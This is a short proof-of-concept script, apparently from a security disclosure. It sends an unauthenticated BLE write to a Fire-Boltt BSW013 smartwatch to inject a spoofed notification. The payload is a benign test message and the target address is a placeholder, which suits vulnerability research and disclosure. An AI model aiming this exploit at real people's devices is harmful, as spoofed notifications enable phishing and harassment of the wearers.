"""
Finding A: Unauthenticated Arbitrary Notification Injection
Fire-Boltt BSW013 Smartwatch, Firmware V0.0.8

Sends a crafted BLE GATT write to the watch's custom UART-style RX
characteristic, with no pairing or bonding, causing it to display an
attacker-controlled notification (title + body) and vibrate.

Requires: bleak (pip install bleak)
"""

import asyncio
from bleak import BleakClient

WATCH_MAC = "XX:XX:XX:XX:XX:XX"  # replace with target watch MAC
RX_UUID = "6e400002-b5a3-f393-e0a9-e50e24dcca9e"
TX_UUID = "6e400003-b5a3-f393-e0a9-e50e24dcca9e"

# Custom, non-captured packet built from scratch using the
# reverse-engineered protocol + checksum (see README for format details)
CUSTOM_NOTIF = bytes.fromhex(
    "AB01006B669D0401007F1A061D012E0F636F6D2E736D612E736D61727476332E70726F"
    "0000000000000000000000000053454355524954592054455354"
    "E280A6000000000000000054686973206D6573736167652077617320696E6A656374"
    "656420776974686F75742070616972696E67"
)


def notification_handler(sender, data):
    print(f"  [NOTIFY] {data.hex(' ').upper()}")


async def main():
    async with BleakClient(WATCH_MAC) as client:
        await client.start_notify(TX_UUID, notification_handler)
        await asyncio.sleep(1.0)
        print(f"Sending CUSTOM_NOTIF ({len(CUSTOM_NOTIF)} bytes) with verified CRC")
        print(">>> WATCH SCREEN NOW <<<")
        await client.write_gatt_char(RX_UUID, CUSTOM_NOTIF, response=False)
        await asyncio.sleep(5)
        print("Done.")


if __name__ == "__main__":
    asyncio.run(main())
